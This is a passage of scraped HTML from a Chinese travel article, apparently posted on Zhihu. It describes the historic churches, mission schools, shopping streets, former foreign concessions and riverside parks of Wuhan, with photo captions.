data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-4e604ec232e55a1929dfea023953d016\" data-watermark-src=\"v2-e932a7d434b58cb15155b132ac9ba2a4\" data-private-watermark-src=\"v2-06a19dc76dac9ff3e2af66d9b9cb3c89\"></p>\n<p>昙华林街边戈甲营44号基督教崇真堂，武昌第一座基督教堂，也是武汉现存年代最早的一所基督教教堂（图片略，自己照上面地址去找吧）。</p>\n<p>基督教伦敦会杨格非牧师是战乱后重兴昙华林第一人，除这座小教堂外还在戈甲营办学校在花园山办医院（武昌仁济医院）。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-0e9bd5c5bd62d5659e4f90be8671f6e0_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"杨格非主持创建武昌仁济医院，规模之大没有进去的人真想不到，目前没有对外开放，只能隔着围栏看看——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0e9bd5c5bd62d5659e4f90be8671f6e0\" data-watermark-src=\"v2-83ca9b7ee008e6dff38dfe050d717046\" data-private-watermark-src=\"v2-9d4e09bb2ebc3589e8f35759f9459bb5\"></p>\n<p>文华书院旧址，武昌昙华林188号，湖北中医药大学昙华林校区内。</p>\n<p>1868年6月，美国圣公会中国地区主教韦廉臣，买下花园山土地先建教堂后建学校，重兴昙华林，继英国伦敦会杨格非牧师之后。</p>\n<p>荒草乱坟的小山开发成风景优美的西式学堂，中文名文华书院，英文名布恩纪念学堂（威廉.琼斯.布恩，中文名文惠廉，美圣公会中国教区第一任主教，一生在中国致力于现代教育业）。</p>\n<p>昙华林圣诞堂，文华书院创建之始的标志。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8817ab2c33f02145da9fb9549b741fa4_720w.jpg?rss\" data-rawwidth=\"2288\" data-rawheight=\"1712\" data-size=\"normal\" data-caption=\"圣诞堂在湖北中医药学院校园中央高地上，建于1870年——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-8817ab2c33f02145da9fb9549b741fa4\" data-watermark-src=\"v2-fba629574cf215324f89f48e89395d56\" data-private-watermark-src=\"v2-80363e053d2bee6caf760bf41926b199\"></p>\n<p>1917年，文华大学、博文书院、博学书院以大学部合并组建华中大学，校址设在昙华林文华大学校区（湖北中医药学院昙华林校区），武汉三镇第一所高等院校诞生。</p>\n<p>华中大学正式建立，大兴土木建设新教学楼、新学生宿舍、新教师宿舍，花园洋房建筑。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d6ce871259f6988ff7b82684dc4ca9cd_720w.jpg?rss\" data-rawwidth=\"2288\" data-rawheight=\"1712\" data-size=\"normal\" data-caption=\"文华书院（当时华中大学）时期的学生宿舍——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-d6ce871259f6988ff7b82684dc4ca9cd\" data-watermark-src=\"v2-9e4a78b9007476544ecce6da9acb3827\" data-private-watermark-src=\"v2-4fac1194b09c55ae035ba655c2c1695b\"></p>\n<p>翟雅阁健身所，20世纪初，文华大学校长孟良佐（美国人，美圣公会湘鄂地区第二任主教）为纪念前任校长翟雅各（英国人）而建，武汉三镇第一所室内体育场，中式古典风格的西式建筑，文物价值极高。近年政府投资修复一新。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c3eb8024b7915134c9d1c1d2d3aca86c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-caption=\"翟雅阁位于昙华林街边，非常好找——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c3eb8024b7915134c9d1c1d2d3aca86c\" data-watermark-src=\"v2-5abe0867cc805e8b45cdcb9b4e859940\" data-private-watermark-src=\"v2-47524943adcadc97b1e389f306661ab8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d041c5f9c6a4c2b33557a522ccc95d77_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"从花园山上看瑞典教区牧师楼，树很美，房子很美——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-d041c5f9c6a4c2b33557a522ccc95d77\" data-watermark-src=\"v2-14e7e9821cf690fd9ca9892558618f7e\" data-private-watermark-src=\"v2-6a13c0379ee0add716f386f8f7ddbd66\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f36bd9d2cb0933f91f29d3138a2d16eb_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街边小山上的树特别美——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f36bd9d2cb0933f91f29d3138a2d16eb\" data-watermark-src=\"v2-58eb634b3102e4dcbafc2c8739831338\" data-private-watermark-src=\"v2-f0388ff5d785654c6b0a01cec74a96e7\"></p>\n<p>花园山顶嘉诺撒修女小教堂（天主教武昌传教区建筑）修复一新，十年前荒草断石夕阳残照的颓废风景没有了，喜欢修复后的新建筑，怀念以前看到的老风景。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-84412431ea4cd2125225bf7c3b310104_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"花园山顶嘉诺撒修女小教堂——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-84412431ea4cd2125225bf7c3b310104\" data-watermark-src=\"v2-943aae2ffbdbe40a6b59b8d03674fcb8\" data-private-watermark-src=\"v2-bf138b71e6e6c5374b6f2b10d8e093e8\"></p>\n<p>往胭脂路方向寻找花园山天主堂和主教公署（今中南神哲学院），19世纪末建筑，建筑本身的价值就不用多说了。</p>\n<p>到任何一个城市旅游我都会寻找宗教建筑，中国古典式（佛寺道观）和西方建筑式（教堂）我都喜欢（个人没有任何宗教信仰）。知道从古至今人们舍得为信仰花钱，宗教建筑的美从来吸引爱好建筑者。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5b2899a86acdaa5a878c713b0d610c54_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"中南神哲学院原主教公署内设图书馆藏书很多（花园山天主教堂就在此建筑隔壁，可以自己去寻找参观）——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-5b2899a86acdaa5a878c713b0d610c54\" data-watermark-src=\"v2-d695d7ebd2fd7d5b3dcc102735153100\" data-private-watermark-src=\"v2-a043df1433fb57e5326c2f5554f5f127\"></p>\n<p>昙华林街心小广场高台上（其实就是山坡上）融园咖啡馆，当地人称牧师楼，原为昙华林瑞典教区主持牧师住宅。小楼外露天木台热咖啡、冰琪琳，小楼内彩色玻璃灯罩华夫饼、煲仔饭，两人对坐时光最美。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-175be7de4bbda952bb04b23a69809a8f_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-caption=\"本文作者胡榴明（左）2017年秋天在瑞典行道会教区牧师公寓现咖啡馆前接受《大武汉》视频采访，关于著作《昙华林》——摄影《大武汉》影视摄制组\" data-watermark=\"watermark\" data-original-src=\"v2-175be7de4bbda952bb04b23a69809a8f\" data-watermark-src=\"v2-b83cec064f9867ae05289bf99d0a8973\" data-private-watermark-src=\"v2-f324c97a4d55bfd91623e3c3e02c9795\"></p>\n<p>出融园顺昙华林主街朝长江方向走，沿路树影摇曳红灯闪烁，小餐馆、小酒吧、咖啡吧、网吧、奶茶店、饰品店，一直延续到小街顶端。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-44c687b3ee626d04884a0062d1615697_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"昙华林街，可能现在已经变化了。因为一直在修建在改造，总之相信会越来越好越来越美——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-44c687b3ee626d04884a0062d1615697\" data-watermark-src=\"v2-99f49e4d6b54e88254526f552d9fa469\" data-private-watermark-src=\"v2-50321e1a8883deec460bd99c1a011b75\"></p>\n<h3>汉口江汉路——中国最长步行街</h3>\n<p>汉口江汉路，老汉口的心脏，起于沿江大道，穿过中山大道、京汉大道，止于新华路。</p>\n<p>始建于清末，逐渐形成汉口商贸集散地，19世纪末因紧邻英租界，扩宽成为碎石马路迅速成为闹市中心。大地产商刘歆生将此路延伸到汉口北郊循礼门（今京汉大道循礼门地铁站一带）刘家花园（刘歆生私家园林，已毁）。英租界工部局报请英女王维多利亚批复，命名歆生路，后和英租界边缘一段合并改名为江汉路。</p>\n<p>2000年，政府将北起江汉四路，南至沿江大道一段定为步行街，长度为1210米，为国内最长的一条步行商业街。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-998ddd25e8e890725cc2e79bb2ecaf66_720w.jpg?rss\" data-rawwidth=\"3130\" data-rawheight=\"2075\" data-size=\"normal\" data-caption=\"江汉路璇宫饭店（1949年前武汉三镇最奢华的大饭店）的门童——胡榴明摄于2005年\" data-watermark=\"watermark\" data-original-src=\"v2-998ddd25e8e890725cc2e79bb2ecaf66\" data-watermark-src=\"v2-dba6277531ab05b173203fa51ab6ce31\" data-private-watermark-src=\"v2-335e9801293ad03e5cc2b1aa37d09a82\"></p>\n<p>江汉路两侧的建筑主要为商埠、饭店、银行、医院、报社、办公楼等，全部西式建筑，老汉口人称“洋房子”。来街上玩，只逛不买，看看老洋房子也是挺好的。在中国，老洋房遍地的城市毕竟不算多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c82ccdb328de8d021d36821f77e7f723_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"江汉路往京汉大道方向一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c82ccdb328de8d021d36821f77e7f723\" data-watermark-src=\"v2-96f536c328a387178aed018e6e23c76e\" data-private-watermark-src=\"v2-67eac4b9c8ac09047f8710a50d4f5ea6\"></p>\n<p>历史悠久，商业繁茂，百年建筑沿街林立。位于汉口老城区，吃喝玩乐样样都有，老牌子门店和新品牌店埠比邻增辉。夜晚，霓虹灯金光闪烁，满街时尚男女，欢声笑语，游玩逛街，天天过大节的感觉。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a80a22e0bf76001a65133407aebfb77c_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"江汉路最美丽的建筑中心百货公司（旧国货商店）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a80a22e0bf76001a65133407aebfb77c\" data-watermark-src=\"v2-db566fe00624f4979380054f02d14afa\" data-private-watermark-src=\"v2-cfcec3468ee3ee91682345353942c0f4\"></p>\n<p>最优秀的街道品质是：没一家店的商业姿态专门拉客外省市游客——没有品牌扎堆（各式各样的大店和小店），没有邀客兜售（可能武汉人商业感不强吧），对本市人怎样对外地人怎样，永远亲和，永远日常，永远时尚如初，百年一日摩登老街，不游等于白来一趟汉口。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f6777da7156924a92e3a5388f35a4bb_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"江汉路和中山大道交叉十字路口夜景，图为兴业银行大楼（复建建筑）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5f6777da7156924a92e3a5388f35a4bb\" data-watermark-src=\"v2-3889c04db4182c970850e32c526f7024\" data-private-watermark-src=\"v2-06e2890d66061831bddff90594b4fe8f\"></p>\n<h3>汉口中山大道——中国城市最热闹的商业大街</h3>\n<p>汉口中山大道：百年商业老街，西南起于硚口，东北止于长江二桥引桥下，全长8.4公里，横贯汉口老城区，街边店铺林立，街上车水马龙，和江汉路交汇的十字路口周边，过去是今天是将来也是武汉三镇最热闹的最人气的商业大街，特别是在街道两侧历史悠久的宏伟瑰丽的老洋楼的衬托下……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b0fff6cd457c30cec4687783cb88b57d_720w.jpg?rss\" data-rawwidth=\"3024\" data-rawheight=\"4032\" data-size=\"normal\" data-caption=\"汉口水塔：中山大道后城马路时期清末第一幢西式建筑，当时汉口最高建筑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b0fff6cd457c30cec4687783cb88b57d\" data-watermark-src=\"v2-ebd7fbe0da4e38202e85ebcb964fb2d3\" data-private-watermark-src=\"v2-013807eae1282eb1d7f8a3d583312191\"></p>\n<p>光绪三十三年（1907年），拆除汉口城墙，将墙基改建马路，上起六渡桥，下至江汉路，名为后城马路。此后数十年，后城马路自江汉路开始向东北方向延伸铺设，逐渐形成今天的规模。</p>\n<p>1927年，改“后城马路”为“中山大道”。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-a536d254fbf578a2c4ef00cfe7d24fbb_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道六渡桥一段，曾经是老汉口华埠最热闹最市民的街区——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a536d254fbf578a2c4ef00cfe7d24fbb\" data-watermark-src=\"v2-263a6186a4cc5ebc6e5a137b806ba892\" data-private-watermark-src=\"v2-a3f7a12128f1943fde73ac6ffdf0eb91\"></p>\n<p>长长一条大街（大马路）横贯汉口老城区，大银行、大商埠、大公司、大饭店、大酒楼，沿街老戏院子数十处，沿街老店美食数十家，白天，门庭洞开，金红翠紫，夜里，华灯初上，金辉满目，寸土寸金的繁华地，时光过去一百年，建筑留下，成为历史。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5ae9843d7a0f55425b39246da1daa466_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道老银行-汉口金城银行，现武汉美术馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5ae9843d7a0f55425b39246da1daa466\" data-watermark-src=\"v2-a8ecb8db33f7a33cf4445bbcad5a740b\" data-private-watermark-src=\"v2-6b81487573088bd34341f32a3e706b2b\"></p>\n<p>走过中国许多城市，定下心来想想，如武汉市中山大道一般历史（114年）、一般景观（百年老建筑和现代大商埠）、一般繁华富丽（吃喝玩乐生意特别好尤其是年轻人特别多）的大街，好像是再也没有第二条（可以反驳）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6e819fa0d7dad3d1ddd076daa1fe8f43_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口中山大道江汉路一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e819fa0d7dad3d1ddd076daa1fe8f43\" data-watermark-src=\"v2-5f222ba964dd15f72aa0f87e792bf52b\" data-private-watermark-src=\"v2-c97d460db42c0ab5dd8d483883f73031\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7216ae0bf56b835f97a8752f290a4ea8_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道南洋大楼（南洋烟草公司）第三层为1926年至1927年武汉国民政府办公地——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7216ae0bf56b835f97a8752f290a4ea8\" data-watermark-src=\"v2-a96f84b37bda03f4613f057b3a66a278\" data-private-watermark-src=\"v2-899806aebbd62a43d93a3354d4ecc467\"></p>\n<p><b>小结：</b>中山大道太长，全部走完不现实。时间有限情况下，可以选择游玩江汉路和中山大道十字路口周边，游玩目的：看百年历史老建筑，买东西（个人随意，两条街上基本什么东西都有），吃东西（百度搜或沿街找）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-62566f91a1aa4d7378a1782311cdaad1_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"中山大道民众乐园，建于20世纪初，与上海大世界、天津劝业场并称为当时中国三大娱乐场（指戏剧等综合娱乐）。不过现在室内已经一无所有，街边看看看建筑还是可以的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-62566f91a1aa4d7378a1782311cdaad1\" data-watermark-src=\"v2-a7656b49ad73cb8ce63a03f7b332a982\" data-private-watermark-src=\"v2-fb7846aa1e40dd729c9730cbd3144b09\"></p>\n<h3>汉口老租界一百五十年</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-f4820c73a419f8c4e7bf0f790940daa8_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"汉口开埠，指武汉三镇海外贸易开始，既如此必须设海关，图中汉口海关江汉关，设于1861年，中国政府办公机构，位于华界和租界交汇处，沿江大道边，江汉路顶端，放在这一节文字，代表汉口外贸历史起源，不属租界，不属租界——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-f4820c73a419f8c4e7bf0f790940daa8\" data-watermark-src=\"v2-8719baaa33ad3ec5cd30ddc43f82cca5\" data-private-watermark-src=\"v2-f58ef736ba22ec69a035519b554642ab\"></p>\n<p>游玩武汉，时间容许的情况下，可以去去汉口老租界。租界在中国，只有几个城市有，假如自家城市没有的话，来汉口瞧个新鲜也是非常值得的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eeed6bcdeb947a9860641e1436997a4d_720w.jpg?rss\" data-rawwidth=\"2587\" data-rawheight=\"1521\" data-size=\"normal\" data-caption=\"汉口旧英租界沿江大道，图右1：英国汇丰银行，图中心：美国花旗银行——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-eeed6bcdeb947a9860641e1436997a4d\" data-watermark-src=\"v2-59d24ae5b8f2c029f756e6cb34599d71\" data-private-watermark-src=\"v2-f437b986538d49b646122e0d5cdb4ade\"></p>\n<p>1861年，汉口开埠，长江江边划英俄德法日五国租界。1865年，英方耗银二十万两在英租界汉口长江边修筑大堤，沿江建码头，堤内修路（今沿江大道），设海关和各国领事馆，划地招商，投资建设——汉口长江时代开始。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e6eb3792fccd9bf6e6e2d2ced08b7442_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口黎黄陂路历史街区风貌街汉口旧俄租界——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e6eb3792fccd9bf6e6e2d2ced08b7442\" data-watermark-src=\"v2-ffa0e2ce2d1e9807095344f9c41e0fc0\" data-private-watermark-src=\"v2-8e8e2ec785815095ce60935dea02bc46\"></p>\n<p>租界建筑包括：商行（公司办公楼）、银行、工厂、住宅、花园、俱乐部、运动场、酒店、餐厅、商店、教堂、医院、学校、报社，领事馆、工部局（租界议会式办公地）、巡捕房……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fbaab737531dc98dc3400f258dbe1407_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"沿江大道边汉口俄租界新泰洋行（俄国茶叶公司大楼）。17世纪中叶华俄茶叶贸易开始，汉口是华俄万里茶叶之路的起点。当年汉口俄侨人数第二日侨人数第一。武汉曾经是一座移民城——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fbaab737531dc98dc3400f258dbe1407\" data-watermark-src=\"v2-20fd26d809f85075e36e87d464e9fcd9\" data-private-watermark-src=\"v2-afa0be6061e3ba57559dde04cc7363c2\"></p>\n<p>一百六十年沧桑过往，其间陆续兴建起来的老房子留下来的都是历史的馈赠。</p>\n<p>历史建筑欣赏是最合算的旅游项目，艺术美学、城市人文，给予人的精神享受，金钱无法估量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-71c540bc007536bc3c6c1e563beff047_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"汉口旧法租界——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-71c540bc007536bc3c6c1e563beff047\" data-watermark-src=\"v2-b35da71061acb1cbc1767753a3b74b8d\" data-private-watermark-src=\"v2-4251c89108915b8e9145453391c0ac04\"></p>\n<p>五国租界建在长江之滨，为的是通商的便利，和出入境的便利，看中的就是长江这一条黄金水道，巨轮越洋，从吴淞口直达汉口码头，西方冒险家纷至沓来，金钱垒出一座崭新的汉口。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-73c598c4f36e047b0a1007d74c2a1386_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"汉口法租界德明饭店（法国人资产）当年武汉三镇最奢华时尚的饭店——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-73c598c4f36e047b0a1007d74c2a1386\" data-watermark-src=\"v2-fa97fad17959db2ff8d6317697c92abb\" data-private-watermark-src=\"v2-c97a624aaf53606bcec4ccfd357c91f8\"></p>\n<p><b>小结</b>：汉口老租界面积非常大，想要一日游两日游不可能，可以先在网上搜搜著名建筑或著名的街，然后手机导航有的放矢地玩一玩。如果懒得寻觅，从江汉关开始一直往长江下游走，沿江大道街边老建筑多是百年建筑经典。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-91b1500679270e4fb260c6c3e3a21d00_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"汉口沿江大道（汉口英租界）英国汇丰银行（现光大银行），百年老建筑，新古典风格，规模宏大，样式华丽，在中国开埠城市开埠建筑中也可以名列前茅——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-91b1500679270e4fb260c6c3e3a21d00\" data-watermark-src=\"v2-4e34975bb89917e8cdb46b63e8b66d39\" data-private-watermark-src=\"v2-b12c3652f2b6febbc72a78fe0b093c0d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6035c4561792d106dfb890d07ea6be37_720w.jpg?rss\" data-rawwidth=\"3568\" data-rawheight=\"2690\" data-size=\"normal\" data-caption=\"2018年5月受武汉外办邀请，胡榴明和黄樱子陪同法国友好代表团朋友游览汉口法租界俄租界交汇街道黎黄陂路历史风貌街——摄影武汉外办小妹妹\" data-watermark=\"watermark\" data-original-src=\"v2-6035c4561792d106dfb890d07ea6be37\" data-watermark-src=\"v2-efd2d1fccf53f27840b5a1f5b2f9a27a\" data-private-watermark-src=\"v2-7b8374dc49cd5d527c400bd7a9174047\"></p>\n<h3>中国最美汉口江滩</h3>\n<p>为了知乎发文，专程去一趟汉口江滩公园，外地朋友来武汉，花半天时间或两个小时三个小时进来游玩，感觉真好！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f047ac13429e40245fd7ba6ab7388cc_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"图左沉浸式表演观摩长江游轮《知音号》，图右对江武昌绿地地产武汉第一高楼——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9f047ac13429e40245fd7ba6ab7388cc\" data-watermark-src=\"v2-22a7e51bf765205fa8d62fc4d359b2ff\" data-private-watermark-src=\"v2-3ee822344e93c9855556130347c990fc\"></p>\n<p>贴一段我文章里的话：</p>\n<p>三镇江滩，最美的还是汉口江滩，我从小生长的地方，熟悉得不能再熟悉，心和身子和它连在一起。</p>\n<p>汉口江滩公园是长江沿岸最美的风景点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d55ddab8b0975da892c08dd6ca75ae34_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d55ddab8b0975da892c08dd6ca75ae34\" data-watermark-src=\"v2-da6d86ce8893866db339cee1412ab691\" data-private-watermark-src=\"v2-87b8eb9ec026208a4ce0d29e470b5aa8\"></p>\n<p>从闹市中走出，来到长江江边，江滩坐下，绿色的草和紫色的花，还有从江面上的凉风，头顶上的太阳。坐在那儿看船看水，看天看地，和江水相亲，和大自然相融合，这样的风景，只是武汉才有，只有汉口的江滩才有。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75862281771c7d9eb76f5341d9dd9ec0_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-75862281771c7d9eb76f5341d9dd9ec0\" data-watermark-src=\"v2-d1d9feed166c59d21f7d57a0fd3a11fe\" data-private-watermark-src=\"v2-4f00e4c3536aabf9bfe7c1366f15e471\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b6ee4065efbedf773c48041479d1cb1f_720w.jpg?rss\" data-rawwidth=\"2268\" data-rawheight=\"4032\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b6ee4065efbedf773c48041479d1cb1f\" data-watermark-src=\"v2-5521da939f4d5c0e8e5aca74a095a80a\" data-private-watermark-src=\"v2-70dd4a12e4dfea7036ec634e370693af\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-67c36593e3ad66750c5cf0b0aebd7089_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"以上数图只是汉口江滩公园之一小部分。春花秋月，夏水冬雪，绿树浓阴，樱花芦花，天水之间沿江看风景，十里滨江，汉口江滩公园——汉口江滩图片全部图片胡榴明摄影\" data-watermark=\"watermark\" data-original-src=\"v2-67c36593e3ad66750c5cf0b0aebd7089\" data-watermark-src=\"v2-11ec7022f795598d667ffd7a6e5ebeda\" data-private-watermark-src=\"v2-4ef6291f213a34e6011cac4f0394b040\"></p>\n<h3>武昌江滩</h3>\n<p>武昌江滩长江观景台夜观江景也很美（手机拍摄夜景图片像素不高，实景非常美）！临江大道沿街建筑和街灯也很美！就不写文了，发图大家欣赏下。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c42445f19c7d53e35fa0094b34521d66_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩公园长江观景台，对岸龟山电视塔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c42445f19c7d53e35fa0094b34521d66\" data-watermark-src=\"v2-d5c7ac360d36091310e48d280d014140\" data-private-watermark-src=\"v2-6446a301cbdf9bbd26debb6eed4f7f94\" data-tags=\"politic\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bdb6f12a774282eecbfdac20dc1431e6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩江畔长江观景台夜观对岸汉阳和汉口的灯火（当时手机像素不高，大家想象感觉一下）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-bdb6f12a774282eecbfdac20dc1431e6\" data-watermark-src=\"v2-e44982bb0c150e864cc3052f0021f330\" data-private-watermark-src=\"v2-c823fca4b185b2fb6f0d2047fa38c271\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-71976447290714d909a0564f1f73a254_720w.jpg?rss\" data-rawwidth=\"2511\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"武昌江滩公园临江大道百年历史老建筑,,今武汉当代艺术中心（Big House）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-71976447290714d909a0564f1f73a254\" data-watermark-src=\"v2-e9271a5ff5a70051409c30645426e718\" data-private-watermark-src=\"v2-c381f28350102eb0a305d54d87f5030b\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e329b0f0e02a0a2da6fd4c6054e14edc_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"武昌江滩公园长江观景台——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e329b0f0e02a0a2da6fd4c6054e14edc\" data-watermark-src=\"v2-29bd095be2adca1a09fc108de68c0751\" data-private-watermark-src=\"v2-3181d7412958021af3f03108853635ab\"></p>\n<h3>武汉天地</h3>\n<p>从汉口江滩公园永清门出来，过沿江大道就是卢沟桥路，往地铁站方向走几分钟便是武汉天地了。我经常跑去喝咖啡或吃晚饭，很方便。</p>\n<p>这一块地方百年前属汉口日租界扩张区，希望详细了解地理人文历史的网友，可以顺带看看我的知乎文章“为什么武汉称为东方芝加哥？”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e858f20f88cc447f2553cd1a06c7c974_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"汉口中山大道两侧的壹方和武汉天地——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e858f20f88cc447f2553cd1a06c7c974\" data-watermark-src=\"v2-3c38c97f4d9817bb4340af17ada6995d\" data-private-watermark-src=\"v2-e63e174a828a02bea89ca6f50fa96a7b\"></p>\n<p>下面链接：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/people/ye-li-ge-52/answers?page=3\" class=\"internal\">知乎用户</a><p><br></p>\n<p>武汉天地我喜欢去的原因：一、花园式美食商圈设定模式比较满我的意，具体看图……</p>\n<p>二、商圈建筑类型是我喜欢的一类——九幢民国时期老公馆分散园区各处，然后用现代主义建筑和现代复古主义建筑把它们一一很具设计感的连通起来，技术为实用服务，新房子和老房子各具特色相互衬托耸立在那里，绿树浓阴覆盖红色的瓦顶，不太冷不太热的天气，露天餐饮，边吃喝边欣赏树木花草和建筑还有雕塑，可以坐半个白天或半个夜晚。</p>\n<p>建筑设计师团队美国伍德公司，波士顿城市建筑特色（红色裸砖房）引入武汉。</p>\n<p>下面直接上图：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4f649196a234f33a513d8fe9cc5d7f70_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" 